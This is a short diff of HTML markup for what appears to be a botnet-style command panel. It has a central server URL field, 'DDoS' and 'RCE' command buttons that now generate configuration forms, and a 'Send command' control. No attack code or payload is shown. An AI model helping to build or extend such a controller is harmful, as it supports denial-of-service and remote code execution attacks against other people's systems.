@@ -18,19 +18,19 @@
                 <h2>Central server configuration</h2>
                 <div class="server-url-config">
                     <input type="text" class="server-url" placeholder="Central server URL" id="serverUrl" value="http://localhost:5000">
-                    <button class="btn btn-primary ml-2" onclick="saveServerUrl()">Save</button>    
+                    <button class="btn btn-primary ml-2" onclick="saveServerUrl(this)">Save</button>    
                 </div>
             </div>
             
     
             <div class="command-picker">
-                <a class="btn-command" onclick="fillCommandDDoS()">DDoS</a>
-                <a class="btn-command">RCE</a>
+                <a class="btn-command" onclick="generateCommandConfigurationForm('ddos')">DDoS</a>
+                <a class="btn-command" onclick="generateCommandConfigurationForm('rce')">RCE</a>
             </div>
     
             <div class="panel">
                 <h2>Command configuration</h2>
-                <textarea id="command"></textarea>
+                <form id="command-configuration"></form>
             </div>
     
             <a class="send-command">Send command</a>
